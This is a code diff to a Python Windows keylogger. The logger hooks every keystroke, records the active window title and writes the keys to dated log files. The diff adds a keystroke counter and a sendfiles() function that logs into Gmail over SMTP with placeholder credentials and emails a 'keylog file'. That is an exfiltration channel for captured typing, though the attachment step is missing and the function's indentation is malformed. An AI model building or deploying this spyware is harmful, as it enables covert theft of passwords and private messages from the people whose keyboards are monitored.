@@ -14,6 +14,15 @@ import zipfile
 import  portalocker
 from stat import S_IREAD, S_IRGRP, S_IROTH
 
+import  smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+
+
+
 
 
 
@@ -28,6 +37,8 @@ from stat import S_IWUSR
 
 global pathforlogs
 global pathforlogsbackup
+global keystrokecount
+keystrokecount = 0
 
 pathforlogs = os.path.join('LogFolders', 'logs')  # defined globally
 
@@ -91,6 +102,34 @@ def givenewline():
 
 
 # The main function of the program. It runs whenever a key is pressed.
+
+  def sendfiles():
+    datelogname = datetime.today().strftime('%m-%d-%Y')
+
+    emailuser = "email"
+    emailpassword = 'email'
+    emailsend = 'email'
+
+    subject = 'Keylogger file for '
+
+    msg = MIMEMultipart()
+    msg['From'] = emailuser
+    msg['To'] = emailsend
+    msg['subject'] = subject
+
+    body = "Hi there, Here is the keylog file for "
+    msg.attach(MIMEText(body, 'plain'))
+
+    text = msg.as_string()  # chages the message to a string
+
+    server = smtplib.SMTP('smtp.gmail.com', 587)  # define the sever to connnect to
+    server.starttls()
+    server.login(emailuser, emailpassword)  # the username and password to use
+
+    server.sendmail(emailuser, emailsend, text)  # the message it will be coming from and the message it will be sent to
+    server.quit()
+
+
 def OnKeyboardEvent(event):
   global windowname
 
@@ -98,10 +137,8 @@ def OnKeyboardEvent(event):
   currentwindow = w.GetWindowText(w.GetForegroundWindow())
 
   datelogname = datetime.today().strftime('%m-%d-%Y')  # to be used for naming the log with the date in it.
-  datetimestamp = datetime.today().strftime(
-    '%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
+  datetimestamp = datetime.today().strftime('%m-%d-%Y %I:%M %p')  # to be used for timestamping the date and the  time the keys were pressed
 
-  # pathforlogs = '/logs2/test'  # defines the folder where the logs will be stored
 
   path = os.getcwd()  # gets the current working directory
 
@@ -162,7 +199,7 @@ def OnKeyboardEvent(event):
   # if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
     # keylogs = ' <Backspace> '
 
-  if event.Ascii == 8:  # if backspace is used, then convert it to the word, back space. This is done to prevent it from showing up as a box.
+  if event.Ascii == 8:  # if backspace is used, then convert it to a blank space. This is done to prevent it from showing up as a box.
     keylogs = ''
 
   if event.Ascii == 9:
@@ -173,15 +210,17 @@ def OnKeyboardEvent(event):
   buffers += keylogs  # Whatever is keylogs equal to, Gets added to the buffers variable.
   NewLineIfWindowChanges()
 
-  locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
 
 
   logfile.write(buffers)  # writes the key pressed  to the file
+  global  keystrokecount  # counter for the number of keystrokes pressed
+
+  keystrokecount += 1 # adds one to the counter each time a key is pressed
+
+  print("Keystroke count is now ", keystrokecount) # prints out the keystroke cuurent count.
 
   logfile.close()  # closes the file
   converttotable()
-  # f2 = open(locationofFileandNameForLogsTable, 'r')
-  # portalocker.lock(f2, portalocker.LOCK_SH | portalocker.LOCK_NB)
   return True
 
 
@@ -197,11 +236,7 @@ def main():
   pythoncom.PumpMessages()
 
   givenewline()
-  datelogname = datetime.today().strftime('%m-%d-%Y')
 
-  # locationofFileandNameForLogsTable = os.path.join(pathforlogs, datelogname + "-logfile.csv")
-  # f2 = open(locationofFileandNameForLogsTable)
-  # portalocker.lock(f2, portalocker.LOCK_SH | portalocker.LOCK_NB)
 
 
 if __name__ == "__main__":
